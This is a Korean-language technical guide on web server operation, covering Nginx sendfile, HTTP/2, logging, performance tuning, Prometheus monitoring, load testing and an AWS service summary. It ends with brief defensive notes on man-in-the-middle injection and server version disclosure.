**sendfile() 시스템 콜 (Zero-Copy):**

```
일반 방식 (비효율):
┌──────────────────────────────────────────────────────────┐
│ 1. read(): 커널 버퍼 → 사용자 공간 (복사 1)              │
│ 2. write(): 사용자 공간 → 커널 버퍼 (복사 2)             │
│ → 2번의 데이터 복사, 컨텍스트 스위칭 발생                │
└──────────────────────────────────────────────────────────┘

sendfile (Zero-Copy):
┌──────────────────────────────────────────────────────────┐
│ sendfile(): 커널 내부에서 직접 전송 (복사 0)             │
│ → 사용자 공간 경유 없이 파일 → 소켓 직접 전송            │
│ → 대용량 파일 전송 성능 크게 향상                        │
└──────────────────────────────────────────────────────────┘
```

**Nginx sendfile 설정:**
```nginx
http {
    sendfile on;
    tcp_nopush on;  # sendfile과 함께 사용, 패킷 효율 증가
}
```

**HTTP/2 멀티플렉싱:**

```
HTTP/1.1:
[연결1] GET /style.css
[연결2] GET /script.js
[연결3] GET /image1.jpg
[연결4] GET /image2.jpg
→ 연결 4개 필요

HTTP/2:
[연결1]
  ├─ Stream 1: GET /style.css
  ├─ Stream 2: GET /script.js
  ├─ Stream 3: GET /image1.jpg
  └─ Stream 4: GET /image2.jpg
→ 연결 1개로 동시 전송
```

**Nginx HTTP/2 설정:**
```nginx
server {
    listen 443 ssl http2;  # HTTP/2 활성화

    ssl_certificate /etc/ssl/certs/example.com.crt;
    ssl_certificate_key /etc/ssl/private/example.com.key;
}
```

### 로그 기록

**액세스 로그:**

```bash
# Nginx 로그 형식
log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                '$status $body_bytes_sent "$http_referer" '
                '"$http_user_agent" "$http_x_forwarded_for" '
                'rt=$request_time uct="$upstream_connect_time" '
                'uht="$upstream_header_time" urt="$upstream_response_time"';

# 로그 예시
203.0.113.50 - - [04/Jan/2026:10:30:45 +0000] "GET /api/users/123 HTTP/1.1" 200 456 "-" "Mozilla/5.0" "-" rt=0.045 uct="0.001" uht="0.042" urt="0.044"
```

**로그 분석 (GoAccess):**

```bash
# 실시간 로그 분석
$ goaccess /var/log/nginx/access.log -o report.html --log-format=COMBINED

# 주요 지표:
- 총 요청 수
- 고유 방문자
- 요청된 파일
- 정적 요청 (CSS, JS, 이미지)
- 404 오류
- 운영체제
- 브라우저
- 응답 시간
```

---

## 실무 팁

### 1. 웹 서버 성능 튜닝

**Nginx 튜닝:**
```nginx
# Worker 프로세스
worker_processes auto;  # CPU 코어 수
worker_rlimit_nofile 65535;  # 파일 디스크립터 제한

events {
    worker_connections 10000;
    use epoll;
    multi_accept on;
}

# 버퍼 크기
client_body_buffer_size 128k;
client_max_body_size 10m;
large_client_header_buffers 4 16k;

# 타임아웃
client_body_timeout 12;
client_header_timeout 12;
send_timeout 10;
```

**시스템 튜닝:**
```bash
# /etc/sysctl.conf
net.core.somaxconn = 65535
net.ipv4.tcp_max_syn_backlog = 8192
net.ipv4.tcp_fin_timeout = 30
net.ipv4.tcp_keepalive_time = 300
net.ipv4.tcp_keepalive_intvl = 30
net.ipv4.tcp_keepalive_probes = 3
fs.file-max = 2097152

# 적용
$ sudo sysctl -p
```

### 2. 모니터링 및 알람

**Prometheus + Grafana:**
```yaml
# prometheus.yml
scrape_configs:
  - job_name: 'nginx'
    static_configs:
      - targets: ['localhost:9113']  # nginx-prometheus-exporter

  - job_name: 'node'
    static_configs:
      - targets: ['localhost:9100']  # node_exporter
```

**알람 규칙:**
```yaml
# alerts.yml
groups:
  - name: web_server
    rules:
      - alert: HighErrorRate
        expr: rate(nginx_http_requests_total{status=~"5.."}[5m]) > 0.05
        annotations:
          summary: "High 5xx error rate"

      - alert: HighResponseTime
        expr: nginx_http_request_duration_seconds > 1
        annotations:
          summary: "Response time > 1s"
```

### 3. 보안 베스트 프랙티스

**체크리스트:**
```bash
1. HTTPS 사용 (TLS 1.2+)
2. 보안 헤더 설정
3. 입력 검증 및 SQL 인젝션 방지
4. CSRF 토큰 사용
5. Rate Limiting
6. 최소 권한 원칙
7. 정기적 업데이트
8. 로그 모니터링
9. 방화벽 설정
10. 백업 및 재해 복구 계획
```

### 4. 부하 테스트

```bash
# Apache Bench
$ ab -n 10000 -c 100 http://www.example.com/

# wrk (HTTP 벤치마크)
$ wrk -t12 -c400 -d30s http://www.example.com/
Running 30s test @ http://www.example.com/
  12 threads and 400 connections
  Thread Stats   Avg      Stdev     Max   +/- Stdev
    Latency    45.23ms   12.45ms 250.12ms   89.34%
    Req/Sec   750.45    123.67     1.20k    78.23%
  270000 requests in 30.01s, 1.23GB read
Requests/sec:   8997.34
Transfer/sec:     42.01MB

# Locust (Python 기반)
$ locust -f locustfile.py --host=http://www.example.com
```

---

## 전체 요청-응답 흐름 요약

```
1. 클라이언트 요청
   [브라우저] → URL 입력
   ↓
2. DNS 조회
   [DNS 서버] → IP 주소 반환
   ↓
3. TCP 연결
   [3-Way Handshake] → 연결 수립
   ↓
4. HTTP 요청 전송
   [클라이언트] → [방화벽] → [로드 밸런서] → [웹 서버]
   ↓
5. 웹 서버 처리
   - 요청 파싱
   - 라우팅
   - 애플리케이션 실행
   - 데이터베이스 조회
   ↓
6. HTTP 응답 생성
   - 상태 코드 설정
   - 헤더 추가
   - 본문 생성
   ↓
7. 응답 전송
   [웹 서버] → [로드 밸런서] → [방화벽] → [클라이언트]
   ↓
8. 브라우저 렌더링
   [HTML 파싱] → [CSS/JS 다운로드] → [렌더링]
   ↓
9. 연결 종료 또는 Keep-Alive
   [4-Way Handshake] 또는 [연결 유지]
```

---

## AWS 서비스 전체 요약

| 카테고리 | AWS 서비스 | 웹 서버 개념 |
|---------|-----------|-------------|
| **컴퓨팅** | EC2 | 웹 서버 호스팅 (Nginx, Apache) |
| | Lambda | 서버리스 요청 처리 |
| | ECS / Fargate | 컨테이너화된 웹 서버 |
| | Elastic Beanstalk | 관리형 웹 애플리케이션 배포 |
| **네트워크** | ALB | HTTP/HTTPS 로드 밸런싱, 경로 기반 라우팅 |
| | NLB | TCP/UDP 로드 밸런싱 |
| | API Gateway | REST/WebSocket API 관리 |
| | CloudFront | CDN, 정적 콘텐츠 캐싱 |
| **데이터베이스** | RDS | 관계형 데이터베이스 |
| | RDS Proxy | 연결 풀 관리, Lambda 최적화 |
| | DynamoDB | 서버리스 NoSQL |
| | ElastiCache | Redis/Memcached 캐싱 |
| **보안** | WAF | SQL Injection, XSS 방어 |
| | Shield | DDoS 방어 |
| | Secrets Manager | DB 접속 정보 관리 |
| | ACM | SSL/TLS 인증서 관리 |
| **모니터링** | CloudWatch | 로그 수집, 메트릭 모니터링 |
| | X-Ray | 분산 추적, 성능 분석 |

> ⚠️ **보안 시나리오 - 웹 서버 응답 조작:**
> 중간자 공격(MITM)으로 서버 응답을 가로채면 HTML에 악성 JavaScript를 주입하거나 다운로드 파일을 악성코드로 교체할 수 있습니다. HTTPS와 서브리소스 무결성(SRI)으로 방어해야 합니다.

> ⚠️ **보안 시나리오 - 서버 정보 노출:**
> `Server: Apache/2.4.41` 헤더가 노출되면 해당 버전의 알려진 취약점을 이용한 공격이 가능합니다. 서버 버전 정보는 숨기고, 에러 페이지에서 스택 트레이스가 노출되지 않도록 해야 합니다.

---

*마지막 업데이트: 2026년 1월*
